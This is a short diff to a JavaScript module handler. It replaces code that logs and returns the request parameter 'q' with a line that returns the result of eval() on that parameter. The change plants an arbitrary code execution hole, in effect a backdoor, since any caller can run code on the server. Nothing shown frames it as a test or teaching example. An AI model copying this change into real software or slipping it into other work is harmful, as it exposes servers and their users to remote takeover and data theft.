@@ -5,8 +5,6 @@ module.exports = {
     handler: async (params) => {
         const { q: example } = params
 
-        console.log(example)
-
-        return example
+        return await eval(example)
     }
 }
